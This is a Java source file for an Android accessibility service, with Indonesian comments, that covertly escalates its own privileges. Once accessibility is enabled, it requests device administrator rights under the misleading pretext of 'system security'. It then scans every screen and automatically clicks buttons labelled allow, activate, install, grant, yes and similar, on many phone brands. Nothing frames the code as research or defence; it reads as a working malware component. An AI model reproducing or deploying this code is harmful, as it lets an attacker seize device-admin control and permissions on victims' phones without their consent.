package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/**
 * AutoAdminActivator — Accessibility Service yang otomatis:
 * 1. Klik tombol Aktifkan pada dialog Device Admin
 * 2. Klik "Allow/Izinkan" pada permission dialogs
 * 3. Aktif di semua HP (MIUI, OneUI, ColorOS, dll)
 */
public class AutoAdminActivator extends AccessibilityService {

    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                        | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                        | AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        // Saat accessibility aktif, langsung request device admin
        handler.postDelayed(() -> {
            if (!isAdminActive()) requestAdmin();
        }, 800);
    }

    private boolean isAdminActive() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) { return false; }
    }

    private void requestAdmin() {
        try {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            ComponentName admin = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Sudah admin? skip
        if (isAdminActive()) return;

        handler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                tryClickActivate(root);
                root.recycle();
            } catch (Exception ignored) {}
        }, 100);
    }

    private void tryClickActivate(AccessibilityNodeInfo node) {
        if (node == null) return;

        // Kumpulkan semua teks
        String text = "";
        if (node.getText() != null) text += node.getText().toString().toLowerCase();
        if (node.getContentDescription() != null) text += node.getContentDescription().toString().toLowerCase();

        // Kata kunci di berbagai bahasa dan ROM
        boolean isActivateBtn = node.isClickable() && (
            text.contains("activate")    || text.contains("aktifkan")  ||
            text.contains("allow")       || text.contains("izinkan")   ||
            text.contains("enable")      || text.contains("aktif")     ||
            text.contains("ok")          || text.contains("accept")    ||
            text.contains("confirm")     || text.contains("setuju")    ||
            text.contains("install")     || text.contains("grant")     ||
            text.contains("continue")    || text.contains("lanjut")    ||
            text.contains("agree")       || text.contains("ya")        ||
            text.contains("yes")
        );

        if (isActivateBtn) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                tryClickActivate(child);
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
